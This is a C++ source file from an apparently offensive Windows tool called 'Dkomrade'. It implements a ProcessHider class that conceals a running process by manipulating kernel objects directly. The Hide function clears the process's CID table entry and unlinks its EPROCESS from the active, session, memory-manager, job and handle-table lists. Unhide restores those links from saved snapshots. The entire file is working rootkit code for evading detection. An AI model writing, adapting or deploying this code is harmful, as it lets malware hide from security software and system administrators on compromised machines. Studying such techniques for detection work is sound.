#include "Dkomrade/Application/ProcessHider.h"

#include <format>

#include "Dkomrade/Internal/LogFormatting.h"

namespace Dkomrade::Application
{
    ProcessHider::ProcessHider(Ports::IKernelMemory& kernelMemory, Ports::ILogger& logger, Domain::KernelOffsets offsets)
        : m_kernelMemory(kernelMemory)
        , m_logger(logger)
        , m_offsets(offsets)
        , m_cidTableWalker(kernelMemory, logger, offsets)
        , m_listEntryEditor(kernelMemory, logger)
        , m_cidEntryEditor(kernelMemory, logger)
    {
    }

    std::optional<Domain::HiddenProcess> ProcessHider::Hide(std::uint64_t pid)
    {
        const std::uint64_t eprocess = m_cidTableWalker.FindEprocessByPid(pid);
        Internal::LogHex(m_logger, "hide eprocess", eprocess);
        if (!eprocess)
        {
            m_logger.Log("hide abort: failed to find target eprocess");
            return std::nullopt;
        }

        auto hiddenProcess = Domain::HiddenProcess{ };
        hiddenProcess.pid = pid;
        hiddenProcess.eprocess = eprocess;

        m_logger.Log("hide: clearing process CID");
        const std::uint64_t processCidEntry = m_cidTableWalker.LookupCidEntry(pid);
        m_cidEntryEditor.SnapshotAndClear(processCidEntry, hiddenProcess.processCid);

        m_logger.Log("hide: unlinking ActiveProcessLinks");
        m_listEntryEditor.SnapshotAndUnlink(eprocess + m_offsets.eprocessActiveProcessLinks, hiddenProcess.activeProcessLinks);

        m_logger.Log("hide: unlinking SessionProcessLinks");
        m_listEntryEditor.SnapshotAndUnlink(eprocess + m_offsets.eprocessSessionProcessLinks, hiddenProcess.sessionProcessLinks);

        m_logger.Log("hide: unlinking MmProcessLinks");
        m_listEntryEditor.SnapshotAndUnlink(eprocess + m_offsets.eprocessMmProcessLinks, hiddenProcess.mmProcessLinks);

        m_logger.Log("hide: unlinking JobLinks");
        m_listEntryEditor.SnapshotAndUnlink(eprocess + m_offsets.eprocessJobLinks, hiddenProcess.jobLinks);

        const auto objectTableOpt = Ports::ReadValue<std::uint64_t>(m_kernelMemory, eprocess + m_offsets.eprocessObjectTable);
        if (!objectTableOpt)
        {
            m_logger.Log("hide: HandleTable skip: read objectTable failed");
        }
        else
        {
            const std::uint64_t objectTable = *objectTableOpt;
            Internal::LogHex(m_logger, "hide objectTable", objectTable);
            if (objectTable)
            {
                m_logger.Log("hide: unlinking HandleTableList");
                m_listEntryEditor.SnapshotAndUnlink(objectTable + m_offsets.handleTableHandleList, hiddenProcess.handleTableList);
            }
            else
            {
                m_logger.Log("hide: HandleTable skip: objectTable zero");
            }
        }

        m_logger.Log("hide done");
        return hiddenProcess;
    }

    bool ProcessHider::Unhide(const Domain::HiddenProcess& hiddenProcess)
    {
        m_logger.Log("unhide start");
        Internal::LogHex(m_logger, "unhide pid", hiddenProcess.pid);
        Internal::LogHex(m_logger, "unhide eprocess", hiddenProcess.eprocess);
        Internal::LogHex(m_logger, "unhide threadCids count", static_cast<std::uint64_t>(hiddenProcess.threadCids.size()));

        bool ok = true;
        m_logger.Log("unhide: restoring process CID");
        ok = m_cidEntryEditor.Restore(hiddenProcess.processCid) && ok;

        std::size_t threadIndex = 0;
        for (const auto& threadCid : hiddenProcess.threadCids)
        {
            m_logger.Log(std::format("unhide: restoring thread CID {}", threadIndex));
            ok = m_cidEntryEditor.Restore(threadCid) && ok;
            ++threadIndex;
        }

        m_logger.Log("unhide: restoring HandleTableList");
        ok = m_listEntryEditor.Restore(hiddenProcess.handleTableList) && ok;
        m_logger.Log("unhide: restoring JobLinks");
        ok = m_listEntryEditor.Restore(hiddenProcess.jobLinks) && ok;
        m_logger.Log("unhide: restoring MmProcessLinks");
        ok = m_listEntryEditor.Restore(hiddenProcess.mmProcessLinks) && ok;
        m_logger.Log("unhide: restoring SessionProcessLinks");
        ok = m_listEntryEditor.Restore(hiddenProcess.sessionProcessLinks) && ok;
        m_logger.Log("unhide: restoring ActiveProcessLinks");
        ok = m_listEntryEditor.Restore(hiddenProcess.activeProcessLinks) && ok;

        Internal::LogHex(m_logger, "unhide ok", static_cast<std::uint64_t>(ok));
        return ok;
    }
}
